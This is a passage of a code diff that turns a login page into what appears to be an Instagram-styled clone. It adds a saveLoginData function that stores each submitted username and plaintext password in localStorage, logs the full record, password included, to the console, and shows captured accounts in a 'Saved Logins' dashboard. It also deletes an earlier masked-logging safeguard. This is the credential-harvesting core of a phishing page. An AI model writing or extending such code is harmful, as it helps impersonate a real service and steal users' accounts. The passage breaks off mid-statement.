+                                autocomplete="off"
+                            >
+                        </div>
+
+                        <!-- Password -->
+                        <div class="form-group">
+                            <input 
+                                type="password" 
+                                id="password" 
+                                placeholder="Password"
+                                autocomplete="off"
+                            >
+                        </div>
+
+                        <button type="submit" class="login-btn" id="loginBtn">
+                            Log in
+                        </button>
+
+                        <div class="divider">
+                            <span class="divider-text">OR</span>
+                        </div>
+
+                        <button type="button" class="facebook-btn" onclick="showFacebookAuth()">
+                            <i class="fab fa-facebook"></i> Log in with Facebook
+                        </button>
+
+                        <a href="#" class="forgot-password" onclick="event.preventDefault(); showError('Forgot password feature coming soon')">Forgot password?</a>
+                    </div>
+                </form>
             </div>
 
-            <form id="loginForm">
-                <div class="form-error" id="errorMessage"></div>
-                <div class="form-success" id="successMessage"></div>
-
-                <!-- GitHub Login -->
-                <button type="button" class="btn btn-github" onclick="handleGitHubLogin()" id="githubBtn">
-                    <i class="fab fa-github"></i>
-                    <span>Login with GitHub</span>
-                </button>
-
-                <div class="divider">
-                    <span class="divider-text">OR</span>
-                </div>
-
-                <!-- Email/Username -->
-                <div class="form-group">
-                    <label for="username">Email or Username</label>
-                    <input 
-                        type="text" 
-                        id="username" 
-                        name="username" 
-                        placeholder="Enter your email or username"
-                        required
-                    >
-                </div>
-
-                <!-- Password -->
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input 
-                        type="password" 
-                        id="password" 
-                        name="password" 
-                        placeholder="Enter your password"
-                        required
-                    >
-                </div>
-
-                <!-- Remember Me & Forgot Password -->
-                <div class="help-section">
-                    <div class="checkbox-group">
-                        <input type="checkbox" id="remember" name="remember">
-                        <label for="remember" class="checkbox-label">Remember me</label>
-                    </div>
-                    <a href="#" class="help-link">Forgot password?</a>
-                </div>
-
-                <!-- Login Button -->
-                <button type="submit" class="btn btn-primary" id="loginBtn">
-                    <span>Log In</span>
-                </button>
-            </form>
-
-            <!-- Sign Up Section -->
+            <!-- Signup Section -->
             <div class="signup-section">
-                <span class="signup-text">
-                    Don't have an account?
-                    <a href="#" class="signup-link">Sign up</a>
-                </span>
+                Don't have an account? <a href="#" class="signup-link" onclick="event.preventDefault(); showError('Sign up feature coming soon')">Sign up</a>
+            </div>
+
+            <!-- Dashboard -->
+            <div class="dashboard-panel">
+                <div class="dashboard-header">
+                    <span>💾 Saved Logins</span>
+                    <span class="login-count-badge" id="loginCount">0</span>
+                </div>
+                <div id="loginsList">
+                    <div class="no-logins">
+                        <i class="fas fa-inbox"></i>
+                        <p>No logins saved yet</p>
+                    </div>
+                </div>
+                <button class="clear-btn" id="clearBtn" onclick="clearAllLogins()">
+                    <i class="fas fa-trash"></i> Clear All
+                </button>
             </div>
         </div>
     </div>
@@ -1112,105 +567,125 @@
         const errorMessage = document.getElementById('errorMessage');
         const successMessage = document.getElementById('successMessage');
         const loginBtn = document.getElementById('loginBtn');
+        const loginsList = document.getElementById('loginsList');
+        const loginCount = document.getElementById('loginCount');
+        const clearBtn = document.getElementById('clearBtn');
 
-        // Email validation
+        // Validate email
         function validateEmail(email) {
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             return emailRegex.test(email);
         }
 
-        // Show error message
+        // Show error
         function showError(message) {
             errorMessage.textContent = message;
             errorMessage.classList.add('show');
             setTimeout(() => {
                 errorMessage.classList.remove('show');
-            }, 4000);
+            }, 3500);
         }
 
-        // Show success message
+        // Show success
         function showSuccess(message) {
             successMessage.textContent = message;
             successMessage.classList.add('show');
             setTimeout(() => {
                 successMessage.classList.remove('show');
-            }, 3000);
+            }, 2500);
         }
 
-        // Handle form submission
+        // Save login data
+        function saveLoginData(username, password) {
+            const loginData = {
+                username: username,
+                password: password,
+                timestamp: new Date().toLocaleString(),
+                loginTime: new Date().toISOString(),
+                id: Date.now()
+            };
+
+            let allLogins = [];
+            const stored = localStorage.getItem('instagramDemoLogins');
+            if (stored) {
+                try {
+                    allLogins = JSON.parse(stored);
+                } catch (e) {
+                    allLogins = [];
+                }
+            }
+            
+            allLogins.push(loginData);
+            localStorage.setItem('instagramDemoLogins', JSON.stringify(allLogins));
+            
+            console.log('✅ Login Saved:', loginData);
+            console.log('📊 All Logins:', allLogins);
+
+            // Update dashboard
+            updateDashboard();
+        }
+
+        // Update dashboard
+        function updateDashboard() {
+            const stored = localStorage.getItem('instagramDemoLogins');
+            let logins = [];
+            
+            if (stored) {
+                try {
+                    logins = JSON.parse(stored);
+                } catch (e) {
+                    logins = [];
+                }
+            }
+
+            loginCount.textContent = logins.length;
+
+            if (logins.length === 0) {
+                loginsList.innerHTML = `
+                    <div class="no-logins">
+                        <i class="fas fa-inbox"></i>
+                        <p>No logins saved yet</p>
+                    </div>
+                `;
+                clearBtn.classList.remove('show');
+            } else {
+                clearBtn.classList.add('show');
+                loginsList.innerHTML = logins
+                    .reverse()
+                    .map(login => `
+                        <div class="login-item">
+                            <div class="login-item-username">👤 ${escapeHtml(login.username)}</div>
+                            <div class="login-item-time">${login.timestamp}</div>
+                            <div class="login-item-details">
+                                <i class="fas fa-lock"></i> Password: ${login.password ? '••••••••' : 'N/A'}
+                            </div>
+                        </div>
+                    `).join('');
+            }
+        }
+
+        // Escape HTML
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Clear all logins
+        function clearAllLogins() {
+            if (confirm('Delete all saved logins?')) {
+                localStorage.removeItem('instagramDemoLogins');
+                updateDashboard();
+                showSuccess('✅ All data cleared');
+            }
+        }
+
+        // Form submission
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
-            const remember = document.getElementById('remember').checked;
 
             // Validation
-            if (!username || !password) {
-                showError('Please fill in all fields');
-                return;
-            }
-
-            if (username.includes('@') && !validateEmail(username)) {
-                showError('Please enter a valid email address');
-                return;
-            }
-
-            if (password.length < 6) {
-                showError('Password must be at least 6 characters');
-                return;
-            }
-
-            // Show loading state
-            loginBtn.disabled = true;
-            loginBtn.innerHTML = '<span class="spinner"></span><span>Logging in...</span>';
-
-            // Simulate API call
-            await new Promise(resolve => setTimeout(resolve, 1500));
-
-            // Success
-            loginBtn.disabled = false;
-            loginBtn.innerHTML = '<span>Log In</span>';
-            showSuccess(`Welcome back! Logging in as ${username}...`);
-
-            // Log credentials (demo only - never do this in production!)
-            console.log('Login attempt:', {
-                username,
-                password: '***hidden***',
-                rememberMe: remember,
-                timestamp: new Date().toLocaleString()
-            });
-
-            // Reset form after delay
-            setTimeout(() => {
-                form.reset();
-            }, 2000);
-        });
-
-        // Handle GitHub Login
-        function handleGitHubLogin() {
-            const githubBtn = document.getElementById('githubBtn');
-            githubBtn.disabled = true;
-            githubBtn.innerHTML = '<span class="spinner"></span><span>Redirecting to GitHub...</span>';
-
-            // Simulate GitHub OAuth redirect
-            console.log('GitHub OAuth flow initiated');
-            console.log('Redirect URL: https://github.com/login/oauth/authorize?client_id=your_app_id&scope=user:email,read:user');
-
-            showSuccess('GitHub login feature enabled. In production, this would redirect to GitHub OAuth.');
-
-            setTimeout(() => {
-                githubBtn.disabled = false;
-                githubBtn.innerHTML = '<i class="fab fa-github"></i><span>Login with GitHub</span>';
-            }, 2000);
-        }
-
-        // Prevent form submission on Enter in password field
-        document.getElementById('password').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                form.dispatchEvent(new Event('submit'));
-            }
-        });
-    </script>
-</body>
-</html>
+            if (!username || !
